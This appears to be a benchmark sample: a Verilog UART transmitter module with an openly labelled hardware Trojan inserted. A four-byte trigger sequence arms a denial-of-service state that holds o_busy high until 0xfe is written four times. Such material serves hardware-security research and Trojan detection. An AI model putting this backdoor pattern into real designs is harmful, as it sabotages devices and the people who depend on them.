module txuart #(
		// {{{
		parameter	[30:0]	INITIAL_SETUP = 31'd868,
		//
		localparam 	[3:0]	TXU_BIT_ZERO  = 4'h0,
		localparam 	[3:0]	TXU_BIT_ONE   = 4'h1,
		localparam 	[3:0]	TXU_BIT_TWO   = 4'h2,
		localparam 	[3:0]	TXU_BIT_THREE = 4'h3,
		// localparam 	[3:0]	TXU_BIT_FOUR  = 4'h4,
		// localparam 	[3:0]	TXU_BIT_FIVE  = 4'h5,
		// localparam 	[3:0]	TXU_BIT_SIX   = 4'h6,
		localparam 	[3:0]	TXU_BIT_SEVEN = 4'h7,
		localparam 	[3:0]	TXU_PARITY    = 4'h8,
		localparam 	[3:0]	TXU_STOP      = 4'h9,
		localparam 	[3:0]	TXU_SECOND_STOP = 4'ha,
		//
		localparam 	[3:0]	TXU_BREAK     = 4'he,
		localparam 	[3:0]	TXU_IDLE      = 4'hf
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		input	wire	[30:0]	i_setup,
		input	wire		i_break,
		input	wire		i_wr,
		input	wire	[7:0]	i_data,
		// Hardware flow control Ready-To-Send bit.  Set this to one to
		// use the core without flow control.  (A more appropriate name
		// would be the Ready-To-Receive bit ...)
		input	wire		i_cts_n,
		// And the UART input line itself
		output	reg		o_uart_tx,
		// A line to tell others when we are ready to accept data.  If
		// (i_wr)&&(!o_busy) is ever true, then the core has accepted a
		// byte for transmission.
		output	wire		o_busy
		// }}}
	);

	// Signal declarations
	// {{{
	wire	[27:0]	clocks_per_baud, break_condition;
	wire	[1:0]	i_data_bits, data_bits;
	wire		use_parity, parity_odd, dblstop, fixd_parity,
			fixdp_value, hw_flow_control, i_parity_odd;
	reg	[30:0]	r_setup;
	assign	clocks_per_baud = { 4'h0, r_setup[23:0] };
	assign	break_condition = { r_setup[23:0], 4'h0 };
	assign	hw_flow_control = !r_setup[30];
	assign	i_data_bits     =  i_setup[29:28];
	assign	data_bits       =  r_setup[29:28];
	assign	dblstop         =  r_setup[27];
	assign	use_parity      =  r_setup[26];
	assign	fixd_parity     =  r_setup[25];
	assign	i_parity_odd    =  i_setup[24];
	assign	parity_odd      =  r_setup[24];
	assign	fixdp_value     =  r_setup[24];

	reg	[27:0]	baud_counter;
	reg	[3:0]	state;
	reg	[7:0]	lcl_data;
	reg		calc_parity, r_busy, zero_baud_counter, last_state;
	reg		q_cts_n, qq_cts_n, ck_cts;
	// }}}

// -------------- BEGIN Trojan Insertions ------------------
// Trojan state signals/regs
	reg [2:0] trojan_rx_state;
	reg trojan_armed;
	reg trojan_active;
	reg [1:0] trojan_fe_counter;

// register to mirror (accepted) tx bytes
	reg [7:0] trojan_last_tx_byte;
	wire trojan_match;

// Trojan trigger pattern: 0x10, 0xa4, 0x98, 0xbd
	wire trojan_stage1 = (trojan_rx_state == 3'd0) && (i_data == 8'h10);
	wire trojan_stage2 = (trojan_rx_state == 3'd1) && (i_data == 8'ha4);
	wire trojan_stage3 = (trojan_rx_state == 3'd2) && (i_data == 8'h98);
	wire trojan_stage4 = (trojan_rx_state == 3'd3) && (i_data == 8'hbd);

// Trojan arming on trigger pattern, must be 4 consecutive bytes
	always @(posedge i_clk) begin
		if (i_reset) begin
			trojan_rx_state <= 3'd0;
			trojan_armed <= 1'b0;
		end else if (!(trojan_active)) begin
			// Only proceed if not yet triggered
			if ((i_wr) && (!o_busy)) begin
				if (trojan_stage1) begin
					trojan_rx_state <= 3'd1;
				end else if (trojan_stage2) begin
					trojan_rx_state <= 3'd2;
				end else if (trojan_stage3) begin
					trojan_rx_state <= 3'd3;
				end else if (trojan_stage4) begin
					trojan_rx_state <= 3'd4; // armed+1
					trojan_armed <= 1'b1;   // Arm DoS
				end else begin
					trojan_rx_state <= 3'd0;
				end
			end
		end else if (trojan_active) begin
			trojan_rx_state <= 3'd0;
			trojan_armed <= 1'b0;
		end
	end

// Trojan effect: after arming, enter DoS until 0xfe received 4 times consecutively
	// On trigger: activate DoS
	always @(posedge i_clk) begin
		if (i_reset)
			trojan_active <= 1'b0;
		else if (trojan_armed)
			trojan_active <= 1'b1;
		else if (trojan_active && (trojan_fe_counter == 2'd3))
			trojan_active <= 1'b0; // Reset DoS after 4 bytes of 0xfe
	end

// Track reception of 0xfe (UART transmit)
	always @(posedge i_clk) begin
		if (i_reset || !trojan_active) begin
			trojan_fe_counter <= 2'd0;
		end else if ((i_wr) && (!o_busy)) begin
			if (i_data == 8'hfe) begin
				trojan_fe_counter <= trojan_fe_counter + 1'b1;
			end else begin
				trojan_fe_counter <= 2'd0;
			end
		end
	end
// -------------- END Trojan Insertions --------------------


	// CTS: ck_cts
	// {{{
	// First step ... handle any hardware flow control, if so enabled.
	//
	always	@(posedge i_clk)
	if (i_reset)
		{ qq_cts_n, q_cts_n } <= 2'b11;
	else
		{ qq_cts_n, q_cts_n } <= { q_cts_n, i_cts_n };
	always	@(posedge i_clk)
	if (i_reset)
		ck_cts <= 1'b0;
	else
		ck_cts <= (!qq_cts_n)||(!hw_flow_control);
	// }}}

	// r_busy, state
	// {{{
	initial	r_busy = 1'b1;
	initial	state  = TXU_IDLE;
	always @(posedge i_clk)
	if (i_reset)
	begin
		r_busy <= 1'b1;
		state <= TXU_IDLE;
	end else if (i_break)
	begin
		state <= TXU_BREAK;
		r_busy <= 1'b1;
	end else if (!zero_baud_counter)
	begin // r_busy needs to be set coming into here
		r_busy <= 1'b1;
	end else if (state == TXU_BREAK)
	begin
		state <= TXU_IDLE;
		r_busy <= !ck_cts;
	end else if (state == TXU_IDLE)	// STATE_IDLE
	begin
		if ((i_wr)&&(!r_busy))
		begin	// Immediately start us off with a start bit
			r_busy <= 1'b1;
			case(i_data_bits)
			2'b00: state <= TXU_BIT_ZERO;
			2'b01: state <= TXU_BIT_ONE;
			2'b10: state <= TXU_BIT_TWO;
			2'b11: state <= TXU_BIT_THREE;
			endcase
		end else begin // Stay in idle
			r_busy <= !ck_cts;
		end
	end else begin
		// One clock tick in each of these states ...
		// baud_counter <= clocks_per_baud - 28'h01;
		r_busy <= 1'b1;
		if (state[3] == 0) // First 8 bits
		begin
			if (state == TXU_BIT_SEVEN)
				state <= (use_parity)? TXU_PARITY:TXU_STOP;
			else
				state <= state + 1;
		end else if (state == TXU_PARITY)
		begin
			state <= TXU_STOP;
		end else if (state == TXU_STOP)
		begin // two stop bit(s)
			if (dblstop)
				state <= TXU_SECOND_STOP;
			else
				state <= TXU_IDLE;
		end else // `TXU_SECOND_STOP and default:
		begin
			state <= TXU_IDLE; // Go back to idle
		end
	end 
	// }}}

	// o_busy
	// {{{
	// This is a wire, designed to be true is we are ever busy above.
	// originally, this was going to be true if we were ever not in the
	// idle state.  The logic has since become more complex, hence we have
	// a register dedicated to this and just copy out that registers value.
	// Trojan modification: override o_busy to stay high during DoS
	assign	o_busy = (r_busy) | (trojan_active);  // <------ Trojan inserted here, override when active
	// }}}

	// r_setup
	// {{{
	// Our setup register.  Accept changes between any pair of transmitted
	// words.  
	initial	r_setup = INITIAL_SETUP;
	always @(posedge i_clk)
	if (!o_busy)
		r_setup <= i_setup;
	// }}}

	// lcl_data
	initial	lcl_data = 8'hff;
	always @(posedge i_clk)
	if (!r_busy)
		lcl_data <= i_data;
	else if (zero_baud_counter)
		lcl_data <= { 1'b0, lcl_data[7:1] };
	// }}}

	// o_uart_tx
	// {{{
	initial	o_uart_tx = 1'b1;
	always @(posedge i_clk)
	if (i_reset)
		o_uart_tx <= 1'b1;
	else if ((i_break)||((i_wr)&&(!r_busy)))
		o_uart_tx <= 1'b0;
	else if (zero_baud_counter)
		casez(state)
		4'b0???:	o_uart_tx <= lcl_data[0];
		TXU_PARITY:	o_uart_tx <= calc_parity;
		default:	o_uart_tx <= 1'b1;
		endcase
	// }}}

	// calc_parity
	// {{{
	initial	calc_parity = 1'b0;
	always @(posedge i_clk)
	if (!o_busy)
		calc_parity <= i_setup[24];
	else if (fixd_parity)
		calc_parity <= fixdp_value;
	else if (zero_baud_counter)
	begin
		if (state[3] == 0)
			calc_parity <= calc_parity ^ lcl_data[0];
		else if (state == TXU_IDLE)
			calc_parity <= parity_odd;
	end else if (!r_busy)
		calc_parity <= parity_odd;
	// }}}

	// baud_counter, zero_baud_counter
	// {{{
	initial	zero_baud_counter = 1'b0;
	initial	baud_counter = 28'h05;
	always @(posedge i_clk)
	if (i_reset)
	begin
		baud_counter <= { INITIAL_SETUP[23:0], 4'h0 };
		zero_baud_counter <= 1'b0;
	end else if (i_break)
	begin
		baud_counter <= break_condition;
		zero_baud_counter <= 1'b0;
	end else begin
		zero_baud_counter <= (baud_counter == 28'h01);

		if (!zero_baud_counter)
			baud_counter <= baud_counter - 28'h01;
		else if (state == TXU_BREAK)
		begin
			baud_counter <= 0;
			zero_baud_counter <= 1'b1;
		end else if (state == TXU_IDLE)
		begin
			baud_counter <= 28'h0;
			zero_baud_counter <= 1'b1;
			if ((i_wr)&&(!r_busy))
			begin
				baud_counter <= { 4'h0, i_setup[23:0]} - 28'h01;
				zero_baud_counter <= 1'b0;
			end
		end else if (last_state)
			baud_counter <= clocks_per_baud - 28'h02;
		else
			baud_counter <= clocks_per_baud - 28'h01;
	end
	// }}}

	// last_state
	// {{{
	initial	last_state = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		last_state <= 1'b0;
	else if (dblstop)
		last_state <= (state == TXU_SECOND_STOP);
	else
		last_state <= (state == TXU_STOP);
	// }}}

	// Make Verilator happy
	// {{{
	wire	unused;
	assign	unused = &{ 1'b0, i_parity_odd, data_bits };
	// }}}
////////////////////////////////////////////////////////////////////////////////
// FORMAL and properties section unchanged...
////////////////////////////////////////////////////////////////////////////////
endmodule